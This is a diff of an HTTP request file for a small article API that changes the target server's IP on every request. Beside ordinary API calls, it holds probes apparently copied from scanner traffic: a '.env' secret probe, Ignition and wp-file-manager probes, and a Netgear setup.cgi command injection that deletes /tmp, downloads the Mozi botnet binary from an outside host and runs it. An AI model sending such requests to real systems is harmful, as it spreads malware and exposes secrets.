@@ -4,40 +4,40 @@ GET http://127.0.0.1:9999/ HTTP/1.1
 
 ###
 
-GET http://3.142.87.225/4a1bf01e-0693-48c5-a52b-fc275205c1d8/__directory__/?DEBUG=1 HTTP/1.1
+GET http://3.137.105.169/4a1bf01e-0693-48c5-a52b-fc275205c1d8/__directory__/?DEBUG=1 HTTP/1.1
 
 ###
 
-GET http://3.142.87.225/4a1bf01e-0693-48c5-a52b-fc275205c1d8/word-cloud-cluster/get-all-articles/ HTTP/1.1
+GET http://3.137.105.169/4a1bf01e-0693-48c5-a52b-fc275205c1d8/word-cloud-cluster/get-all-articles/ HTTP/1.1
 
 ###
 
-GET http://3.142.87.225/4a1bf01e-0693-48c5-a52b-fc275205c1d8/word-cloud-cluster/get-one-article/606617debe3b17d2f95eac5a/ HTTP/1.1
+GET http://3.137.105.169/4a1bf01e-0693-48c5-a52b-fc275205c1d8/word-cloud-cluster/get-one-article/606617debe3b17d2f95eac5a/ HTTP/1.1
 
 
 ###
 
-GET http://3.142.87.225/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://113.89.86.44:51972/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.1
+GET http://3.137.105.169/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://113.89.86.44:51972/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.1
 
 ###
 
-GET http://3.142.87.225/.env HTTP/1.1
+GET http://3.137.105.169/.env HTTP/1.1
 
 ###
 
-GET http://3.142.87.225/_ignition/execute-solution HTTP/1.1
+GET http://3.137.105.169/_ignition/execute-solution HTTP/1.1
 
 ###
 
-GET http://3.142.87.225/wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1
+GET http://3.137.105.169/wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1
 
 ###
 
-GET http://3.142.87.225/Autodiscover/Autodiscover.xml HTTP/1.1
+GET http://3.137.105.169/Autodiscover/Autodiscover.xml HTTP/1.1
 
 ###
 
-POST http://3.142.87.225/4a1bf01e-0693-48c5-a52b-fc275205c1d8/word-cloud-cluster/update-one-article/606617debe3b17d2f95eac5a/?debug=1 HTTP/1.1
+POST http://3.137.105.169/4a1bf01e-0693-48c5-a52b-fc275205c1d8/word-cloud-cluster/update-one-article/606617debe3b17d2f95eac5a/?debug=1 HTTP/1.1
 content-type: application/json
 
 {
@@ -48,7 +48,7 @@ content-type: application/json
 
 ###
 
-POST http://3.142.87.225/4a1bf01e-0693-48c5-a52b-fc275205c1d8/word-cloud-cluster/add-one-article/?debug=1 HTTP/1.1
+POST http://3.137.105.169/4a1bf01e-0693-48c5-a52b-fc275205c1d8/word-cloud-cluster/add-one-article/?debug=1 HTTP/1.1
 content-type: application/json
 
 {
@@ -63,7 +63,7 @@ content-type: application/json
 
 ###
 
-POST http://3.142.87.225/4a1bf01e-0693-48c5-a52b-fc275205c1d8/v1/hello-world/ HTTP/1.1
+POST http://3.137.105.169/4a1bf01e-0693-48c5-a52b-fc275205c1d8/v1/hello-world/ HTTP/1.1
 content-type: application/json
 
 {
@@ -75,7 +75,7 @@ content-type: application/json
 
 ###
 
-POST http://3.142.87.225/4a1bf01e-0693-48c5-a52b-fc275205c1d8/word-cloud-cluster/get-all-articles/ HTTP/1.1
+POST http://3.137.105.169/4a1bf01e-0693-48c5-a52b-fc275205c1d8/word-cloud-cluster/get-all-articles/ HTTP/1.1
 content-type: application/json
 
 {
@@ -84,6 +84,6 @@ content-type: application/json
 
 ###
 
-POST http://3.142.87.225/ HTTP/1.1
+POST http://3.137.105.169/ HTTP/1.1
 content-type: application/json
 
